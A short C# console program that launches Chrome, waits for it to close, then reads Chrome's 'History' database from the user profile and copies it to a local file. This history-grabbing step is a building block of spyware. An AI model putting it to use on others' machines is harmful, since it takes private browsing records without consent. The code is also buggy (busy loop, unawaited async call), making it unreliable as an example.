using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;
using System.Threading.Tasks;

namespace Copi
{
    class Program
    {
        static void Main(string[] args)
        {
            bool isOpen = false;
            Process p = null;
            do
            {
                if (isOpen == false)
                {
                    p = Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + @"\Google\Chrome\Application\chrome.exe");
                    isOpen = true;
                }
                if (p.HasExited)
                {
                    Count();
                    Thread.Sleep(123);
                    return;
                }


            } while (true);

            // WriteFile(newPath, ms);

            // альтернатива с помощью класса File
            // File.Copy(path, newPath, true);

        }
        
        public static async void Count()
        {
            try
            {
                string appData = System.Environment.GetFolderPath(System.Environment.SpecialFolder.LocalApplicationData);
                appData += @"\Google\Chrome\User Data\Default";


                string path = appData;
                string newPath = System.Environment.GetFolderPath(System.Environment.SpecialFolder.Desktop);
                FileInfo fileInf = new FileInfo(path);

                string[] files = Directory.GetFiles(appData);
                foreach (var f in files)
                {

                    if (Path.GetFileName(f).ToString().Equals("History"))
                    {
                        appData = Path.GetFullPath(f);

                    }
                }

                FileStream ms = new FileStream(appData, FileMode.Open, FileAccess.ReadWrite, FileShare.Read);
                Console.WriteLine(ms.Seek(0, SeekOrigin.Begin));
                byte[] buffer = new byte[ms.Length];
                int len;
                while ((len = await ms.ReadAsync(buffer, 0, buffer.Length)) > 0)
                {

                }
                Console.WriteLine(ms.Length);
                Console.WriteLine(buffer.Length);

                File.WriteAllBytes("history", buffer);


            }
            catch (Exception)
            {
                Console.WriteLine("asd");
            }


        }


    }

}
